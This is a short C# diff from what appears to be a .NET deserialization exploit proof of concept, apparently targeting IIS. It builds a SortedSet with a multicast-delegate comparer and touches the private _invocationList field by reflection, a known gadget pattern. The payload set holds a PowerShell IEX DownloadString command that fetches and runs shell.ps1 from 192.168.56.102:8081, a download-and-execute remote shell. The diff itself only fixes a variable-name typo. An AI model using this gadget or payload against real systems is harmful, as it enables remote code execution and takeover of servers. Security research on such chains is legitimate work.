@@ -16,7 +16,7 @@ namespace hawktraceiis
             Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
             IComparer<string> comp = Comparer<string>.Create(d);
             SortedSet<string> set = new SortedSet<string>(comp);
-            csharpset.Add("powershell.exe");
+            set.Add("powershell.exe");
             set.Add("-Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.102:8081/shell.ps1')\"");
 
             FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
@@ -42,4 +42,5 @@ namespace hawktraceiis
     }
 
 }
+
 
